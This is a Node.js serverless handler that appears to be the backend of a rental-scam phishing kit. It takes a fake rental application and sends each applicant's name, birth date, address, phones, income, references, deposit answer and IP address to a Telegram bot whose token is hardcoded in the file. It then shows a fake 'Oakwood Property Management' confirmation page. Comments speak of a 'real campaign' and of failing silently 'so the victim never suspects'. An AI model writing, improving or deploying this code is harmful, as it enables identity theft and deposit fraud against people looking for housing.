const https = require('https');

// ============ YOUR SECRET CODES ============
const BOT_TOKEN = '8599934735:AAGgL4MeTqbUM_gzNsAUcLMwxCnbGSOcn-4';   // from @BotFather
const CHAT_ID   = '8604770803';     // from @userinfobot
// ===========================================

// DEBUG = true shows error details on the page while you test,
// so you can SEE what's wrong. Set to false for the real campaign.
const DEBUG = true;

exports.handler = async (event) => {
  if (event.httpMethod !== 'POST') {
    return { statusCode: 404, body: 'Not found' };
  }

  const params = new URLSearchParams(event.body || '');
  const get = (k) => (params.get(k) || '').trim();

  const data = {
    full_name:      get('full_name'),
    dob:            get('dob'),
    email:          get('email'),
    home_phone:     get('home_phone'),
    cell_phone:     get('cell_phone'),
    address:        get('address'),
    age:            get('age'),
    marital_status: get('marital_status'),
    occupants:      get('occupants'),
    pet:            get('pet'),
    car:            get('car'),
    occupation:     get('occupation'),
    monthly_income: get('monthly_income'),
    smoke_drink:    get('smoke_drink'),
    night_work:     get('night_work'),
    reference:      get('reference'),
    move_in:        get('move_in'),
    stay_length:    get('stay_length'),
    deposit:        get('deposit'),
    ready_today:    get('ready_today'),
    ip:             event.headers['x-nf-client-connection-ip'] || event.headers['x-forwarded-for'] || 'unknown',
    user_agent:     event.headers['user-agent'] || 'unknown'
  };

  const msg =
    '<b>📋 NEW RENT APPLICATION</b>\n' +
    '──────────────────\n' +
    '👤 Name:        ' + data.full_name + '\n' +
    '📅 DOB:         ' + data.dob + ' (age ' + data.age + ')\n' +
    '📧 Email:       ' + data.email + '\n' +
    '🏠 Address:     ' + data.address + '\n' +
    '☎️ Home:        ' + data.home_phone + '\n' +
    '📱 Cell:        ' + data.cell_phone + '\n' +
    '💍 Marital:     ' + data.marital_status + '\n' +
    '👨‍👩‍👧 Occupants:   ' + data.occupants + '\n' +
    '🐶 Pet:         ' + data.pet + ' | 🚗 Car: ' + data.car + '\n' +
    '💼 Occupation:  ' + data.occupation + '\n' +
    '💰 Income/mo:   $' + data.monthly_income + '\n' +
    '🍺 Smoke/Drink: ' + data.smoke_drink + ' | 🌙 Night: ' + data.night_work + '\n' +
    '📇 Reference:   ' + data.reference + '\n' +
    '📆 Move-in:     ' + data.move_in + ' (' + data.stay_length + ')\n' +
    '💵 Deposit:     $' + data.deposit + ' — today? ' + data.ready_today + '\n' +
    '──────────────────\n' +
    '🕐 ' + data.ip + ' | ' + data.user_agent;

  // Deliver to Telegram — and actually listen for the reply this time
  try {
    await new Promise((resolve, reject) => {
      const body = JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: 'HTML' });
      const req = https.request({
        hostname: 'api.telegram.org',
        path: '/bot' + BOT_TOKEN + '/sendMessage',
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Content-Length': Buffer.byteLength(body)
        }
      }, (res) => {
        let resp = '';
        res.on('data', (c) => { resp += c; });
        res.on('end', () => {
          if (res.statusCode === 200) {
            resolve();
          } else {
            reject(new Error('Telegram replied HTTP ' + res.statusCode + ': ' + resp));
          }
        });
      });
      req.on('error', reject);
      req.write(body);
      req.end();
    });
  } catch (err) {
    if (DEBUG) {
      // You'll see this on screen during testing — fix what it says
      return { statusCode: 500, body: 'Telegram error: ' + err.message };
    }
    // Live mode: fail silently so the victim never suspects
  }

  const safeName  = (data.full_name || 'there').replace(/[<>&"]/g, '');
  const safeEmail = (data.email || '').replace(/[<>&"]/g, '');

  return {
    statusCode: 200,
    headers: { 'Content-Type': 'text/html; charset=utf-8' },
    body:
      '<!DOCTYPE html><html><head><meta charset="UTF-8">' +
      '<meta name="viewport" content="width=device-width, initial-scale=1.0">' +
      '<title>Application Received</title></head>' +
      '<body style="font-family:Arial,sans-serif;background:#f0f2f5;text-align:center;padding-top:80px;">' +
      '<div style="background:#fff;max-width:480px;margin:0 auto;padding:40px;border-radius:8px;box-shadow:0 4px 16px rgba(0,0,0,.1);">' +
      '<h2 style="color:#1b3a5c;margin-top:0;">✅ Application Received</h2>' +
      '<p style="color:#666;line-height:1.6;">Thank you, <strong>' + safeName + '</strong>.<br>' +
      'We will contact you at <strong>' + safeEmail + '</strong> within 24–48 hours.</p>' +
      '<p style="color:#999;font-size:13px;">Oakwood Property Management · Equal Housing Opportunity</p>' +
      '</div></body></html>'
  };
};
